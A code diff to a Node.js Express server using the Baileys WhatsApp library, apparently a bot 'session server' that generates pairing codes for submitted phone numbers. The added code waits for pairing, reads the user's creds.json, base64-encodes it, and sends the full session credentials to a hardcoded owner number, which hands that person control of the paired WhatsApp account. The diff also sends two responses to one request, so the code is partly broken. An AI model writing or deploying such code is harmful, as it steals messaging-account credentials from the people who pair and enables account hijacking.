@@ -3,23 +3,23 @@ import makeWASocket, {
   useMultiFileAuthState
 } from "@whiskeysockets/baileys";
 import pino from "pino";
-import path from "path";
-import { fileURLToPath } from "url";
-
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+import fs from "fs";
 
 const app = express();
 app.use(express.json());
-app.use(express.static(__dirname));
 
-app.post("/pair", async (req, res) => {
+const OWNER_NUMBER = "+242XXXXXXXX"; // 🔴 TON NUMÉRO ICI
+
+app.post("/session", async (req, res) => {
   const { number } = req.body;
-  if (!number) return res.json({ error: "Numéro requis" });
 
-  const { state, saveCreds } = await useMultiFileAuthState(
-    "./sessions/" + number
-  );
+  if (!number || !number.startsWith("+"))
+    return res.json({ error: "Numéro invalide (ex: +242XXXXXXX)" });
+
+  const sessionDir = `./sessions/${number.replace("+", "")}`;
+  fs.mkdirSync(sessionDir, { recursive: true });
+
+  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
 
   const sock = makeWASocket({
     auth: state,
@@ -30,13 +30,43 @@ app.post("/pair", async (req, res) => {
   sock.ev.on("creds.update", saveCreds);
 
   try {
-    const code = await sock.requestPairingCode(number);
-    res.json({ code });
-  } catch (e) {
-    res.json({ error: "Impossible de générer le code" });
+    const pairingCode = await sock.requestPairingCode(number);
+
+    // On attend la validation WhatsApp
+    setTimeout(async () => {
+      try {
+        const creds = fs.readFileSync(`${sessionDir}/creds.json`);
+        const SESSION_ID = Buffer.from(creds).toString("base64");
+
+        // 📩 Envoi de la session au OWNER
+        await sock.sendMessage(
+          OWNER_NUMBER.replace("+", "") + "@s.whatsapp.net",
+          {
+            text:
+              `🔥 NOUVELLE SESSION ID 🔥\n\n` +
+              `📱 Numéro : ${number}\n\n` +
+              `🔐 SESSION_ID 👇\n\n${SESSION_ID}`
+          }
+        );
+
+        res.json({
+          success: true,
+          session_id: SESSION_ID
+        });
+
+        sock.end();
+      } catch {
+        res.json({ error: "Session non validée, réessaie" });
+      }
+    }, 20000);
+
+    res.json({ pairing_code: pairingCode });
+  } catch {
+    res.json({ error: "Erreur WhatsApp" });
   }
 });
 
-app.listen(3000, () => {
-  console.log("🔥 Madara Session Server lancé sur le port 3000");
-});
+app.listen(3000, () =>
+  console.log("🔥 Madara Session Server PRO lancé")
+);
+
